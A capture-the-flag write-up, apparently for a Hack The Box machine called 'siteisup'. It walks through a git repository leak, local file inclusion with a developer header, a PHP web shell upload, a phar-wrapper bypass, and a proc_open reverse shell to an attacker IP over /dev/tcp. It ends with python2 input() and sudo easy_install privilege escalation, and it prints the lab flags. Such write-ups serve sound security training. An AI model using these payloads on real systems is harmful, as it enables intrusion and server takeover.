IP: 10.10.11.177
# Enumeration
## Nmap
```bash
Nmap scan report for 10.10.11.177
Host is up (0.010s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Website
A website that checks if a page is up.
Checking our host to see if it can reach us.

This gives a host name
`siteisup.htb`

## Gobuster
```bash
gobuster -m dir -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o webroot.gobuster -u http://10.10.11.177
```
Found a dev directory which means another gobuster.
`.git` dir

# Code analysis
Git dumper to dump the repo.
```bash
python3 /opt/git-dumper/git_dumper.py http://siteisup.htb/dev/.git/ .
```
Looking at the index.php page there is a lfi for the page parameter which will append .php to any file that is not included in the following regex:
```
/bin|usr|home|var|etc/i
```
There is also a blacklist on `check.php` for what file types are not allowed.
```
/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i
```
Looking at the git logs there is a commit that removes `.htpasswd` which also has a `.htaccess` file.

```bash
git checkout 354fe069f6205af09f26c99cfe2457dea3eb6a6c
cat ./.git/.htaccess

SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
Which is a header to add in the request for the lfi.
# LFI
There is also mention of a dev vhost (subdomian)
This page (you have to add the header to see it) is a file upload page.

Try the LFI now on the vhost with the header.
```http
GET /?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Special-Dev: only4dev
```
The page uploads to the uploads directory.
The server wipes the upload as soon as the check is done. To stop this we can just keep the connection open with nc
```bash
nc -lvnkp 9001

```
Using a payload (file.txt) of:
```php
<?php system($_GET['cmd']); ?>
http://10.10.14.19:9001
```
which works!
## Filter bypassing
Next is to try to get code execution. We can use a php phar wrapper. It's like a zip that the phar filter can go into and run files. The cool thing about this is the only check is the magic byte so if it is called pahr_zip.notmalware it will run :)

Just use zip to turn it into a phar file.
This gives a 500 internal error :(
```http
GET /?page=phar://uploads/31da4fcf76bb3b1c8eaf9c1a23abdf24/test.notmalware/file HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Special-Dev: only4dev
```

Check if this happens for a simple echo.

This works.
```http
HTTP/1.1 200 OK
Date: Fri, 27 Jan 2023 13:41:13 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 107
Connection: close
Content-Type: text/html; charset=UTF-8

<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
hellohttp://10.10.14.19:9001
```
## Dealing with a blacklist
So there is RCE, which means there is some sort of black/white list. Lets check php info to find disabled functions.
```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```
system is included so thats why we have the 500.

There is a dfunc-bypasser script on github which has a list of all the 'dangerous functions'
```
dangerous_functions = ['pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail']
```

proc_open (looked manually but here is a python script.)
```python
dangerous_functions = ['pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail']

phpinfo = ['pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','pcntl_unshare','error_log','system','exec','shell_exec','popen','passthru','link','symlink','syslog','ld','mail','stream_socket_sendto','dl','stream_socket_client','fsockopen']

print(*[x for x in dangerous_functions if x not in phpinfo]) # lol x in a not b (the venn diagram stuff from way to long ago)
```
seems to not be in the phpinfo file.
## Payload
Create a rev shell.
```php
<?php
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.19/9001 0>&1'";
$pipe = array(
	0 => array("pipe","r"),
	1 => array("pipe","w"),
	2 => array("pipe","w")
);
$proc = proc_open($cmd, $pipe, $pipes);
?>
```
Ta da foothold!
# Priv esc
## Part 1
There is a python2 file `/home/developer/dev/siteisup_test.py` which uses input. This can lead to code exec (cause python2 is dumb).
```python
__import__('os').system("bash")
```
YAY! (I **LOVE** python priv esc paths)

Still cant cat the user flag. Just going to take the ssh key instead.

Now finally user.txt
```
2b720ab6b7c66788c3a9e42a3af7a14c
```
## Part 2
`sudo -l` says easy_install and gtfobins says
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
root.txt
```
1f254877e04615bf2c9d76322a3f6491
```